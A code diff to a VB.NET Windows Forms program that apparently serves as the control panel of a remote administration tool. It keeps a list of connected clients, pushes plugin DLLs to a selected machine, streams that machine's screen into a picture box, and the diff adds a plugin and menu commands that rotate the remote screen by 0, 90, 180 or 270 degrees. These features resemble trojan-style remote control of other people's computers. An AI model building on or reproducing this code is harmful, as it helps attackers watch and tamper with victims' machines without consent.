@@ -44,6 +44,13 @@ Public Class Form1
         MKWFGA.Animations.Animation(Me.Handle, 1000, MKWFGA.Animations.AnimtedFlags.Blend)
 
     End Sub
+    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
+        ABTForm.Show()
+    End Sub
+
+    Private Sub UcBtnExt2_BtnClick_1(sender As Object, e As EventArgs) Handles UcBtnExt2.BtnClick
+        ABTForm.Show()
+    End Sub
 
 
 
@@ -95,11 +102,32 @@ Public Class Form1
             While True
 
                 Dim ui As Image = bf.Deserialize(lp)
+                '"|R|"
+
+                ' Dim Buffer(1024 * 500) As Byte
+                '  Dim lu As Integer = lp.Read(Buffer, 0, Buffer.Length)
+
+                'If lu > 0 Then
+
+
+                'Dim Message As String = Encoding.Default.GetString(Buffer, 0, lu)
+
+                '  Dim o = Message.Replace("|R|", "")
+
+                '  Dim IM As Byte() = Encoding.Default.GetBytes(o)
+
+                '  Dim MM = New IO.MemoryStream(IM)
+
+
 
                 foorm.PictureBox1.Image = ui
 
+                    '    End If
 
-                GC.Collect()
+
+
+
+                    GC.Collect()
                 GC.WaitForPendingFinalizers()
 
             End While
@@ -1049,7 +1077,8 @@ Public Class Form1
        "\PLUGINS\MSCT.dll",
        "\PLUGINS\VRSA.dll",
        "\PLUGINS\IJCT.dll",
-       "\PLUGINS\ECF.dll"
+       "\PLUGINS\ECF1.dll",
+      "\PLUGINS\SCRO.dll"
     }
 
 
@@ -1063,7 +1092,8 @@ Public Class Form1
     Public PL_MSCT As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(7)))
     Public PL_VRSA As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(8)))
     Public PL_IJCT As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(9)))
-    Public PL_ECF As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(10)))
+    Public PL_ECF1 As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(10)))
+    Public PL_SRCO As String = Encoding.Default.GetString(IO.File.ReadAllBytes(S_PaTH & PL_Path(11)))
     '
 #End Region
 
@@ -1678,6 +1708,50 @@ Public Class Form1
 
 
             Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|SPND|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub R0ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles R0ToolStripMenuItem2.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|0R|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub R90ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles R90ToolStripMenuItem3.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|90|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub R180ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles R180ToolStripMenuItem4.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|180|" & "|ENDING|"
+
+            Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
+
+        End If
+    End Sub
+
+    Private Async Sub R270ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles R270ToolStripMenuItem5.Click
+        If AeroListView1.SelectedItems.Count = 1 Then
+
+
+            Dim o As String = PL_SRCO & "|SP1|" & "" & "|SP2|" & "|270|" & "|ENDING|"
 
             Await Task.Run(Sub() SenderHelper.SenderHelper(CliSt, AeroListView1.SelectedItems(0).Text, o))
 
